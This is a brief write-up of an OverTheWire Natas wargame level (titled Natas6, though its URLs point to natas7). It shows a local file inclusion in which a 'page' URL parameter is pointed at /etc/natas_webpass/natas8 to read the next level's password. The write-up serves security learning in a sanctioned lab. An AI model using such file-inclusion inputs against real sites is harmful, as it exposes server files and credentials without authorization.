# Natas6 writeup

Upon entering the site there are two buttons 'Home' and 'About'
Clicking home redirects to
`http://natas7.natas.labs.overthewire.org/index.php?page=home`
and clicking about redirects to
`http://natas7.natas.labs.overthewire.org/index.php?page=about`

In the source code we can see a hint.
`<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->`

By changing the url to `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8` hopefully it will show the password.

Navigating to `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8` reveals the password.
